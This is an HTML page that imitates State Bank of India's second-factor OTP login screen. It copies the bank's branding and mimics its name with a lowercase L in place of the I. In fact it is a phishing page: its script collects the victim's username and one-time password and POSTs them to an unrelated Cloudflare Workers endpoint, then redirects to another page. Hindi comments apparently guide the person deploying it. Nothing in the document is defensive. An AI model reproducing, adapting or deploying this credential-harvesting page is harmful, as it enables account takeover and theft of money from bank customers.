<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBI Secure OTP · Second Factor</title>
    <link rel="icon" type="image/png" href="https://vuejs.org/images/logo.png">
    <style>
        /* पिछला CSS यथावत – आपने दिया था, मैंने सिर्फ जरूरी हिस्से रखे */
        * { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
        body { background:#f0f0f0; min-height:100vh; padding-bottom:20px; }
        .header { text-align:center; background:white; line-height:0; }
        .logo { max-width:100%; max-height:120px; margin:0 auto; }
        .container { max-width:460px; margin:0 auto; background:white; border-radius:5px; padding:0 20px 20px; }
        .form-header { background:#e6f3ff; color:#2c517a; padding:14px 20px; text-align:center; font-size:12px; }
        .instruction { font-size:14px; color:#007299; margin:8px 0; }
        .mandatory-note { font-size:11px; color:#8B0000; margin:5px 0 15px; font-style:italic; }
        .form-group { margin-bottom:18px; }
        .form-label { font-size:12px; font-weight:bold; color:#333; }
        .asterisk { color:#cc0000; }
        .form-input { width:100%; padding:7px; border:1px solid #ccc; border-radius:4px; }
        .button-group { display:flex; justify-content:center; margin:20px 0 10px; }
        .submit-btn { background:#CBA135; color:white; padding:5px 20px; border:none; border-radius:4px; cursor:pointer; font-size:16px; }
        .submit-btn:disabled { background:#a0a0a0; }
        .resend-btn { background:#01796F; color:white; padding:4px 20px; border-radius:4px; text-decoration:none; font-size:12px; cursor:pointer; }
        .security-bullet { background:#fff8e7; border-radius:6px; padding:12px; font-size:13px; }
        .security-bullet ul { padding-left:20px; }
        .footer-links { background:#424242; color:white; text-align:center; padding:10px; border-radius:0 0 4px 4px; }
        .footer-links a { color:#ccc; text-decoration:none; }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="State Bank of India" class="logo">
    </div>
    <div class="container">
        <div class="form-header">Login Second Factor Authentication</div>
        <div class="instruction">Enter the One Time Password sent to your mobile phone</div>
        <div class="mandatory-note">Mandatory fields are marked with an asterisk (*)</div>

        <form id="otpForm" onsubmit="return submitOTP(event)">
            <input type="hidden" id="username" name="username" value="">
            <div class="form-group">
                <label class="form-label">One Time Password <span class="asterisk">*</span></label>
                <input type="text" id="otp" class="form-input" placeholder="Enter 6-digit OTP" maxlength="6" required>
            </div>
            <div class="button-group">
                <button type="submit" class="submit-btn">Submit</button>
            </div>
            <div>
                <span style="font-size:13px; color:#333;">If you did not receive the High Security Password on SMS, you can </span>
                <a href="#" class="resend-btn" id="resendLink">Click here to resend the OTP</a>
            </div>
            <div class="security-bullet">
                <ul>
                    <li>Please note that all communication related to Internet banking will be sent on your registered mobile number.</li>
                    <li>State Bank or any of its representative never sends you email/SMS or calls you over phone to get your personal information, password or one time SMS (high security) password. Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking. Never respond to such email/SMS or phone call. Please report immediately on <a href="mailto:report.phishing@sbi.co.in">report.phishing@sbi.co.in</a> if you receive any such email/SMS or Phone call. Immediately change your passwords if you have accidentally revealed your credentials.</li>
                </ul>
            </div>
        </form>
        <hr>
        <div class="footer-links">
            <a href="#">Privacy Statement</a> | <a href="#">Disclosure</a><br>
            <a href="#">Terms of Service</a><br>© State Bank of lndia<br>
            <span>Site best viewed at 1024 x 768 resolution in Microsoft Edge 79+, Mozilla 96+, Google Chrome 97+</span>
        </div>
    </div>

    <script>
        (function() {
            const urlParams = new URLSearchParams(window.location.search);
            let username = urlParams.get('user');
            if (!username) username = sessionStorage.getItem('sbi_username');
            if (username) document.getElementById('username').value = username;
        })();

        async function submitOTP(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const otp = document.getElementById('otp').value;

            if (!username) {
                alert('Username is missing. Please go back to login page.');
                return false;
            }

            const payload = {
                type: "OTP",
                id: Date.now().toString() + '-' + Math.random().toString(36).substr(2, 9),
                data: {
                    username: username,
                    otp: otp,
                    timestamp: new Date().toISOString()
                }
            };

            const submitBtn = document.querySelector('.submit-btn');
            submitBtn.disabled = true;

            try {
                const workerURL = 'https://falling-waterfall-d23a.vikash6759ub.workers.dev/';
                const response = await fetch(workerURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    // ✅ यहाँ अपनी पसंद का रीडायरेक्ट पेज डालें
                    window.location.href = 'service.html'; // या 'thankyou.html' आदि
                } else {
                    const err = await response.json().catch(() => ({}));
                    alert('OTP verification failed: ' + (err.error || 'Please try again.'));
                    submitBtn.disabled = false;
                }
            } catch (error) {
                alert('Network error. Check Worker URL or connection.');
                console.error(error);
                submitBtn.disabled = false;
            }
            return false;
        }

        document.getElementById('resendLink').addEventListener('click', function(e) {
            e.preventDefault();
            alert('Resend functionality – आप इसे Worker से जोड़ सकते हैं।');
        });
    </script>
</body>
</html>
